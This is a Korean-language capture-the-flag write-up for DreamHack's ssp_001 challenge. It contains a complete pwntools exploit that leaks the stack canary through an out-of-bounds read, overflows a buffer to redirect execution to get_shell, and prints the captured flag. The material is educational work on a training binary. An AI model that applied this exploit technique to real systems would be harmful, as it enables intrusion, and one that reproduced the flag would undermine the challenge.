# [DreamHack] ssp_001

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 이 문제는 작동하고 있는 서비스(ssp_001)의 바이너리와 소스코드가 주어집니다.
> 프로그램의 취약점을 찾고 SSP 방어 기법을 우회하여 익스플로잇해 셸을 획득한 후, “flag” 파일을 읽으세요.
> “flag” 파일의 내용을 워게임 사이트에 인증하면 점수를 획득할 수 있습니다.
> 플래그의 형식은 DH{…} 입니다.
>
> Release: [ssp_001.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8546951/ssp_001.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/159597718-9e6c7ae8-3c4a-4575-b829-4b8def7dd13a.png)

## Analysis

```c
            case 'P':
                printf("Element index : ");
                scanf("%d", &idx);
                print_box(box, idx);
                break;
```

```c
void print_box(unsigned char *box, int idx) {
    printf("Element of index %d is : %02x\n", idx, box[idx]);
}
```

`[P]rint the box` 메뉴는 스택의 데이터 1바이트를 출력해 주는데, `idx`에 대한 검사가 없어서 OOB가 발생한다. 따라서 스택에 있는 임의의 값을 뽑아낼 수 있다. 여기서 canary를 leak할 수 있다.

```c
            case 'E':
                printf("Name Size : ");
                scanf("%d", &name_len);
                printf("Name : ");
                read(0, name, name_len);
                return 0;
```

`[E]xit` 메뉴를 선택하면 `name`에 원하는 길이만큼 입력을 줄 수 있어 BOF가 발생한다. 앞에서 구한 canary를 이용하여 `main()`의 return address를 `get_shell()`의 주소로 덮으면 셸을 획득할 수 있다.

## Exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/ssp_001')
else:
    r = remote('host3.dreamhack.games', 14017)

sla = r.sendlineafter
sa = r.sendafter

def print_box(idx):
    sla('> ', 'P')
    sla('Element index : ', str(idx))

def Exit(name_len, name):
    sla('> ', 'E')
    sla('Name Size : ', str(name_len))
    sa('Name : ', name)

get_shell = 0x80486b9 # get_shell()

# canary leak
canary = 0
for idx in range(0x80, 0x84):
    print_box(idx)
    canary += (int(r.recvline()[-3:-1], 16) << ((idx - 0x80) * 8))

# overwrite return address of main() with get_shell()
Exit(0x50, b'a' * 0x40 + p32(canary) + b'a' * 8 + p32(get_shell))

r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host3.dreamhack.games on port 14017: Done
[*] Switching to interactive mode
$ cat flag
DH{00c609773822372daf2b7ef9adbdb824}
```